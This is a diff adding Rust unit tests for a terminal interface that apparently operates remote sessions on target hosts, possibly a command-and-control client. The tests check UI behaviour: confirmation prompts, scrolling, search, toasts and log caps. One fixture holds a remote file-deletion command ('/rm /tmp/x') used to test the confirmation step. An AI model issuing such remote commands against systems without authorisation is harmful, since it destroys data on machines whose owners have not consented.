+        let (snap_tx, snap_rx) = std::sync::mpsc::channel();
+        let (cmd_tx, cmd_rx) = std::sync::mpsc::channel();
+        let mut app = App::new(Bridge {
+            snapshots: snap_rx,
+            cmds: cmd_tx,
+        });
+        app.sessions = vec![SessionView {
+            id: "cafebabe".into(),
+            ..fake_session()
+        }];
+        app.pane_tree
+            .set_session_id(app.focused_pane, Some("cafebabe".into()));
+
+        // 键入 /kill 回车 → 进确认态
+        {
+            let st = app.focused_state_mut();
+            st.input = "/kill".into();
+            st.cursor = 4;
+        }
+        app.submit();
+        assert!(app.confirm_action.is_some());
+
+        // --- 分支 A：按 n 取消 ---
+        app.handle_key(KeyEvent::new(KeyCode::Char('n'), KeyModifiers::NONE));
+        assert!(app.confirm_action.is_none(), "n 应取消 confirm");
+        assert!(cmd_rx.try_recv().is_err(), "取消时不应派发");
+
+        // 重新进确认态
+        {
+            let st = app.focused_state_mut();
+            st.input = "/kill".into();
+            st.cursor = 4;
+        }
+        app.submit();
+        assert!(app.confirm_action.is_some());
+
+        // --- 分支 B：按 y 确认 → 派发 Cmd::Exit ---
+        app.handle_key(KeyEvent::new(KeyCode::Char('y'), KeyModifiers::NONE));
+        assert!(app.confirm_action.is_none(), "y 后 confirm 应清空");
+        match cmd_rx.try_recv() {
+            Ok(Cmd::Exit { session }) => {
+                assert_eq!(session, "cafebabe", "应向选中 session 派发 Exit");
+            }
+            Ok(_) => panic!("y 确认后应派发 Cmd::Exit，got 其他 Cmd"),
+            Err(_) => panic!("y 确认后 worker 应收到 Cmd::Exit，但 channel 空"),
+        }
+        let _ = snap_tx;
+    }
+
+    /// 确认态下其他键被吞掉（必须显式 y/n/Esc），confirm_action 保持。
+    #[test]
+    fn confirm_swallows_unrelated_keys() {
+        let mut app = fake_app();
+        app.confirm_action = Some(ConfirmAction {
+            cmd: "/rm /tmp/x".into(),
+            description: "Delete file /tmp/x on the target?".into(),
+        });
+        // 一个不相关的字符键
+        app.handle_key(KeyEvent::new(KeyCode::Char('a'), KeyModifiers::NONE));
+        assert!(
+            app.confirm_action.is_some(),
+            "无关键不应取消 confirm（必须显式 y/n/Esc）"
+        );
+        // Enter 也不应触发（不是 y/n/Esc）
+        app.handle_key(KeyEvent::new(KeyCode::Enter, KeyModifiers::NONE));
+        assert!(app.confirm_action.is_some(), "Enter 在 confirm 态应被吞掉");
+        // Esc 应取消
+        app.handle_key(KeyEvent::new(KeyCode::Esc, KeyModifiers::NONE));
+        assert!(app.confirm_action.is_none(), "Esc 应取消 confirm");
+    }
+
+    /// 非破坏性命令不触发确认（直接派发）。
+    #[test]
+    fn non_destructive_command_skips_confirm() {
+        let (snap_tx, snap_rx) = std::sync::mpsc::channel();
+        let (cmd_tx, cmd_rx) = std::sync::mpsc::channel();
+        let mut app = App::new(Bridge {
+            snapshots: snap_rx,
+            cmds: cmd_tx,
+        });
+        app.sessions = vec![SessionView {
+            id: "abc12345".into(),
+            ..fake_session()
+        }];
+        app.pane_tree
+            .set_session_id(app.focused_pane, Some("abc12345".into()));
+        {
+            let st = app.focused_state_mut();
+            st.input = "/getuid".into();
+            st.cursor = st.input.len();
+        }
+        app.submit();
+        assert!(
+            app.confirm_action.is_none(),
+            "/getuid 非破坏性，不应进 confirm"
+        );
+        // 应直接派发
+        assert!(cmd_rx.try_recv().is_ok(), "/getuid 应直接派发到 worker");
+        let _ = snap_tx;
+    }
+
+    // ---- overlay scrolling (Task 1) ----
+
+    /// overlay 打开时 overlay_scroll 复位到 0（通过 /sessions 路径校验）。
+    #[test]
+    fn overlay_scroll_resets_when_sessions_overlay_opens() {
+        let mut app = fake_app();
+        app.sessions = vec![fake_session()];
+        // 预设一个非零滚动，模拟之前在别的 overlay 里滚过。
+        app.overlay_scroll = 42;
+        // 走 /sessions 命令路径打开 overlay。
+        app.run_meta("/sessions", "");
+        assert!(app.overlay.is_open(), "/sessions 应打开 overlay");
+        assert_eq!(
+            app.overlay_scroll, 0,
+            "overlay 打开时 overlay_scroll 必须复位为 0"
+        );
+    }
+
+    /// 表格 overlay 的 ↑/↓ 键调整 overlay_scroll（不落 pane_scroll）。
+    #[test]
+    fn overlay_arrow_keys_scroll_table_overlay() {
+        let mut app = fake_app();
+        // 一个有很多行的 Files overlay，确保可滚。
+        let rows: Vec<FileEntry> = (0..200)
+            .map(|i| FileEntry {
+                name: format!("f{i}"),
+                size: i,
+                is_dir: false,
+                modified: "x".into(),
+            })
+            .collect();
+        app.overlay = Overlay::Files(rows);
+        app.overlay_scroll = 0;
+        // 按 ↓：scroll 增加 1。
+        app.handle_overlay_key(KeyEvent::new(KeyCode::Down, KeyModifiers::empty()));
+        assert_eq!(app.overlay_scroll, 1, "↓ 应让 overlay_scroll +1");
+        // 按 ↑：scroll 回到 0（saturating sub）。
+        app.handle_overlay_key(KeyEvent::new(KeyCode::Up, KeyModifiers::empty()));
+        assert_eq!(app.overlay_scroll, 0, "↑ 应让 overlay_scroll 回 0");
+        // ↑ 再按不会下溢成 usize::MAX。
+        app.handle_overlay_key(KeyEvent::new(KeyCode::Up, KeyModifiers::empty()));
+        assert_eq!(app.overlay_scroll, 0, "↑ 在 0 处不应下溢");
+    }
+
+    /// PgUp/PgDn 在表格 overlay 里按页滚动（页大小 ≈ 焦点窗格可视高度）。
+    #[test]
+    fn overlay_pgup_pgdn_scrolls_by_page() {
+        let mut app = fake_app();
+        let rows: Vec<FileEntry> = (0..300)
+            .map(|i| FileEntry {
+                name: format!("f{i}"),
+                size: i,
+                is_dir: false,
+                modified: "x".into(),
+            })
+            .collect();
+        app.overlay = Overlay::Files(rows);
+        // 先 render 一帧，让 focused_pane_rect 被填充（页大小依赖它）。
+        let mut term = Terminal::new(TestBackend::new(80, 24)).unwrap();
+        term.draw(|f| render(&mut app, f)).unwrap();
+        app.overlay_scroll = 0;
+        // overlay_scroll 顶部锚定：PgDn 向底加，PgUp 向顶减。
+        app.handle_overlay_key(KeyEvent::new(KeyCode::PageDown, KeyModifiers::empty()));
+        // 页大小 = focused_pane_rect.height - 4（最少 1），应 > 0。
+        let page = app.focused_pane_rect.height.saturating_sub(4).max(1) as usize;
+        assert!(page > 0, "页大小应 > 0");
+        assert_eq!(
+            app.overlay_scroll, page,
+            "PgDn 应按页大小（{page}）增加 overlay_scroll"
+        );
+        app.handle_overlay_key(KeyEvent::new(KeyCode::PageUp, KeyModifiers::empty()));
+        assert_eq!(app.overlay_scroll, 0, "PgUp 应减回 0");
+    }
+
+    /// Sessions overlay 的 ↑/↓ 仍是选区导航（不碰 overlay_scroll），PgUp/PgDn 才滚动。
+    #[test]
+    fn sessions_overlay_arrows_navigate_selection_pguipdn_scrolls() {
+        let mut app = fake_app();
+        app.sessions = vec![
+            SessionView {
+                id: "aaaa1111aaaa".into(),
+                ..fake_session()
+            },
+            SessionView {
+                id: "bbbb2222bbbb".into(),
+                ..fake_session()
+            },
+        ];
+        let mut st = ListState::default();
+        st.select(Some(0));
+        app.overlay = Overlay::Sessions(st);
+        app.overlay_scroll = 5;
+        // ↓ → 选区下移（不是 overlay_scroll）。
+        app.handle_overlay_key(KeyEvent::new(KeyCode::Down, KeyModifiers::empty()));
+        if let Overlay::Sessions(s) = &app.overlay {
+            assert_eq!(s.selected(), Some(1), "↓ 应移动选区到第 2 行");
+        } else {
+            panic!("overlay 仍是 Sessions");
+        }
+        assert_eq!(app.overlay_scroll, 5, "↓ 不应改 overlay_scroll（选区导航）");
+        // PgDn → overlay_scroll 增加（向底滚动列表）。
+        app.handle_overlay_key(KeyEvent::new(KeyCode::PageDown, KeyModifiers::empty()));
+        assert!(
+            app.overlay_scroll > 5,
+            "PgDn 应增加 overlay_scroll（向底滚动），got {}",
+            app.overlay_scroll
+        );
+    }
+
+    /// overlay 滚动后，Sessions overlay 的 click 仍能命中正确的 session
+    /// （session_row_rects 现带全局索引）。render 会把 scroll clamp 到 max_scroll，
+    /// 所以这里读回实际渲染的首行全局索引，再验证点击它选中那个 session。
+    #[test]
+    fn click_sessions_overlay_after_scroll_hits_right_session() {
+        use crossterm::event::{MouseButton, MouseEvent, MouseEventKind};
+        let mut app = fake_app();
+        // 造 20 个 session，初始选第 0 个。
+        app.sessions = (0..20)
+            .map(|i| SessionView {
+                id: format!("{:012x}", i),
+                hostname: format!("h{i}"),
+                ..fake_session()
+            })
+            .collect();
+        let mut st = ListState::default();
+        st.select(Some(0));
+        app.overlay = Overlay::Sessions(st);
+        let mut term = Terminal::new(TestBackend::new(80, 24)).unwrap();
+        term.draw(|f| render(&mut app, f)).unwrap();
+        // 滚动量设很大，让 render clamp 到 max_scroll（只显示尾部）。
+        app.overlay_scroll = 100;
+        term.draw(|f| render(&mut app, f)).unwrap();
+        // 首行的全局索引应 > 0（证明确实滚动了），且 < 20。
+        let (first_rect, first_idx) = app.session_row_rects[0];
+        assert!(
+            first_idx > 0,
+            "滚动后首行全局索引应 > 0（确实滚动了），got {first_idx}"
+        );
+        assert!(first_idx < 20, "首行索引应 < 20");
+        // 点首行 → 应切到 first_idx 对应的 session。
+        app.handle_mouse(MouseEvent {
+            kind: MouseEventKind::Down(MouseButton::Left),
+            column: first_rect.x + 5,
+            row: first_rect.y,
+            modifiers: KeyModifiers::empty(),
+        });
+        let selected = app.pane_tree.get_session_id(app.focused_pane);
+        let expected = format!("{:012x}", first_idx);
+        assert_eq!(
+            selected.as_deref(),
+            Some(expected.as_str()),
+            "点击滚动后的首行应选中 idx {first_idx} 的 session"
+        );
+    }
+
+    // ---- event stream search (Task 2) ----
+
+    /// Ctrl+F 进入搜索输入态。
+    #[test]
+    fn ctrl_f_enters_search_input_mode() {
+        let mut app = fake_app();
+        assert!(app.search_input.is_none());
+        app.handle_key(KeyEvent::new(KeyCode::Char('f'), KeyModifiers::CONTROL));
+        assert!(app.search_input.is_some(), "Ctrl+F 应进入搜索输入态");
+    }
+
+    /// 搜索输入态下敲字符追加到 search_input；Esc 清空退出。
+    #[test]
+    fn search_input_typing_and_esc_clears() {
+        let mut app = fake_app();
+        app.search_input = Some(String::new());
+        app.handle_key(KeyEvent::new(KeyCode::Char('e'), KeyModifiers::empty()));
+        app.handle_key(KeyEvent::new(KeyCode::Char('r'), KeyModifiers::empty()));
+        app.handle_key(KeyEvent::new(KeyCode::Char('r'), KeyModifiers::empty()));
+        assert_eq!(app.search_input.as_deref(), Some("err"));
+        // 同时让过滤生效（Enter 提交）。
+        app.handle_key(KeyEvent::new(KeyCode::Enter, KeyModifiers::empty()));
+        assert_eq!(app.search_query.as_deref(), Some("err"));
+        assert!(app.search_input.is_none(), "Enter 后退出输入态");
+        // Esc 清空。
+        // 重新进入输入态再 Esc。
+        app.search_input = Some("x".into());
+        app.handle_key(KeyEvent::new(KeyCode::Esc, KeyModifiers::empty()));
+        assert!(app.search_input.is_none(), "Esc 退出输入态");
+        assert!(app.search_query.is_none(), "Esc 清空 search_query");
+    }
+
+    /// 搜索过滤只影响显示：底层 stream 仍持有全部行。
+    /// 这里通过 log() 注入行，设 search_query，确认 stream.len() 不变。
+    #[test]
+    fn search_filter_does_not_mutate_underlying_stream() {
+        let mut app = fake_app();
+        app.log("error one", Level::Err);
+        app.log("info two", Level::Info);
+        app.log("error three", Level::Err);
+        let total = app.stream.len();
+        app.search_query = Some("error".into());
+        // 不直接读渲染，但确认 stream 完整。
+        assert_eq!(app.stream.len(), total, "stream 不应被过滤改动");
+        // 计数匹配（render_stream_content 的过滤逻辑镜像）。
+        let ql = "error".to_string();
+        let hits = app
+            .stream
+            .iter()
+            .filter(|l| l.text.to_lowercase().contains(&ql))
+            .count();
+        assert_eq!(hits, 2, "应匹配 2 行含 error");
+    }
+
+    /// 搜索栏在输入态渲染不崩，且 buffer 含 search 提示。
+    #[test]
+    fn render_search_bar_input_mode_no_panic() {
+        let mut app = fake_app();
+        app.log("hello", Level::Info);
+        app.search_input = Some("hel".into());
+        let mut term = Terminal::new(TestBackend::new(80, 24)).unwrap();
+        term.draw(|f| render(&mut app, f)).unwrap();
+        let buf_str: String = term
+            .backend()
+            .buffer()
+            .content()
+            .iter()
+            .map(|c| c.symbol())
+            .collect();
+        assert!(buf_str.contains("search"), "搜索栏应显示 search 提示");
+    }
+
+    /// 纯过滤态渲染不崩，buffer 含 filter 提示 + 查询词。
+    #[test]
+    fn render_search_bar_filter_mode_no_panic() {
+        let mut app = fake_app();
+        app.log("target line", Level::Ok);
+        app.search_query = Some("target".into());
+        let mut term = Terminal::new(TestBackend::new(80, 24)).unwrap();
+        term.draw(|f| render(&mut app, f)).unwrap();
+        let buf_str: String = term
+            .backend()
+            .buffer()
+            .content()
+            .iter()
+            .map(|c| c.symbol())
+            .collect();
+        assert!(buf_str.contains("filter"), "纯过滤态应显示 filter 提示");
+        assert!(buf_str.contains("target"), "应显示查询词");
+    }
+
+    // ---- configurable stream_cap (Task 3) ----
+
+    /// /config stream_cap <N> 改变上限并立即裁剪现有 stream。
+    #[test]
+    fn config_stream_cap_truncates_stream() {
+        let mut app = fake_app();
+        // 灌 100 行。
+        for i in 0..100 {
+            app.log(&format!("line {i}"), Level::Info);
+        }
+        assert_eq!(app.stream.len(), 100);
+        assert_eq!(app.stream_cap, DEFAULT_STREAM_CAP);
+        // 改到 50：应裁掉前 50 行（保留最新 50）。
+        app.run_meta("/config", "stream_cap 50");
+        assert_eq!(app.stream_cap, 50);
+        assert_eq!(app.stream.len(), 50, "改小后 stream 应被裁到 50");
+        // 保留的是最新的：run_meta 自身的确认日志会追加 1 行（又挤掉最老的 1 行），
+        // 所以存活的数据行是 line 51..99 + 确认日志。验证最老存活行 >= 50 即可。
+        assert!(
+            app.stream
+                .iter()
+                .filter(|l| l.text.contains("line "))
+                .map(|l| l.text.clone())
+                .min()
+                .is_some_and(|s| s.contains("line 5")),
+            "应保留 line 5x 系列（最新），got stream: {:?}",
+            app.stream.first().map(|l| &l.text)
+        );
+        // 确认日志在最后一行。
+        assert!(
+            app.stream.last().unwrap().text.contains("stream_cap"),
+            "最后一行应是 /config 的确认日志"
+        );
+    }
+
+    /// /config stream_cap 拒绝 0。
+    #[test]
+    fn config_stream_cap_rejects_zero() {
+        let mut app = fake_app();
+        app.run_meta("/config", "stream_cap 0");
+        assert_eq!(app.stream_cap, DEFAULT_STREAM_CAP, "0 应被拒，cap 不变");
+    }
+
+    /// /config 无参数显示当前值（不崩，日志记到 stream）。
+    #[test]
+    fn config_no_args_shows_current() {
+        let mut app = fake_app();
+        app.run_meta("/config", "");
+        // 应在 stream 里留下含 stream_cap 的信息行。
+        assert!(
+            app.stream.iter().any(|l| l.text.contains("stream_cap")),
+            "/config 应显示当前 stream_cap"
+        );
+    }
+
+    /// log() 在改小 cap 后也尊重新上限（不会超）。
+    #[test]
+    fn log_respects_custom_stream_cap() {
+        let mut app = fake_app();
+        app.run_meta("/config", "stream_cap 10");
+        for i in 0..50 {
+            app.log(&format!("x{i}"), Level::Info);
+        }
+        assert_eq!(app.stream.len(), 10, "log 应尊重自定义 cap 10");
+        // 保留最新 10 行：x40..x49。
+        assert!(app.stream.last().unwrap().text.contains("x49"));
+    }
+
+    // ---- toast notifications ----
+
+    /// A toast whose duration has already elapsed reports expired. We build it
+    /// with a 0s duration so `created.elapsed()` (>= 0) is immediately true.
+    #[test]
+    fn toast_appears_and_expires() {
+        let mut t = Toast::new("boom", Level::Err);
+        // Force expiry: 0s duration means any elapsed time qualifies.
+        t.duration = Duration::from_secs(0);
+        // elapsed() is at least the cost of this call, so >= 0s holds.
+        std::thread::sleep(Duration::from_millis(1));
+        assert!(
+            t.is_expired(),
+            "0s-duration toast must be expired immediately"
+        );
+        // A fresh non-zero toast should NOT be expired yet.
+        let fresh = Toast::new("hi", Level::Info);
+        assert!(!fresh.is_expired(), "fresh 3s toast should not be expired");
+    }
+
+    /// Adding more than 5 toasts caps the list at 5 (oldest dropped first).
+    #[test]
+    fn toast_cap_at_five() {
+        let mut app = fake_app();
+        for i in 0..7 {
+            app.toast(format!("t{i}"), Level::Info);
+        }
+        assert_eq!(
+            app.toasts.len(),
+            5,
+            "toasts must cap at 5, got {}",
+            app.toasts.len()
+        );
+        // Oldest two (t0, t1) dropped; first surviving should be t2.
+        assert_eq!(
+            app.toasts[0].text, "t2",
+            "oldest surviving toast should be t2"
+        );
+        assert_eq!(app.toasts.last().unwrap().text, "t6");
+    }
+
+    /// toast() pushes in order and respects level-specific durations.
+    #[test]
+    fn toast_duration_scales_with_level() {
+        let info = Toast::new("x", Level::Info);
+        let ok = Toast::new("x", Level::Ok);
+        let warn = Toast::new("x", Level::Warn);
+        let err = Toast::new("x", Level::Err);
+        assert_eq!(info.duration, Duration::from_secs(3));
+        assert_eq!(ok.duration, Duration::from_secs(3));
+        assert_eq!(warn.duration, Duration::from_secs(5));
+        assert_eq!(err.duration, Duration::from_secs(5));
+    }
+
+    /// poll_worker sweeps expired toasts each frame (retain non-expired).
+    #[test]
+    fn poll_worker_expires_old_toasts() {
+        let mut app = fake_app();
+        app.toast("gone", Level::Info);
+        // Force the lone toast to be expired.
+        app.toasts[0].duration = Duration::from_secs(0);
+        std::thread::sleep(Duration::from_millis(1));
+        app.poll_worker();
+        assert!(
+            app.toasts.is_empty(),
+            "expired toast should be swept by poll_worker"
+        );
+    }
+
+    /// Rendering with active toasts does not panic and the text reaches the buffer.
+    #[test]
+    fn render_toasts_no_panic_and_visible() {
+        let mut app = fake_app();
+        app.toast("TOAST_MARKER_OK", Level::Ok);
+        app.toast("TOAST_MARKER_ERR", Level::Err);
+        let mut term = Terminal::new(TestBackend::new(80, 24)).unwrap();
+        term.draw(|f| render(&mut app, f)).unwrap();
+        let buf_str: String = term
+            .backend()
+            .buffer()
+            .content()
+            .iter()
+            .map(|c| c.symbol())
+            .collect();
+        assert!(
+            buf_str.contains("TOAST_MARKER_OK"),
+            "Ok toast text should render to buffer"
+        );
+        assert!(
+            buf_str.contains("TOAST_MARKER_ERR"),
+            "Err toast text should render to buffer"
+        );
+    }
+
+    /// fake SessionView 构造助手（测试用，字段填充任意合法值）。
+    /// SessionView derives Default，只覆盖测试关心的字段。
+    fn fake_session() -> SessionView {
+        SessionView {
+            hostname: "testhost".into(),
+            os: "linux".into(),
+            ..Default::default()
+        }
     }
 }
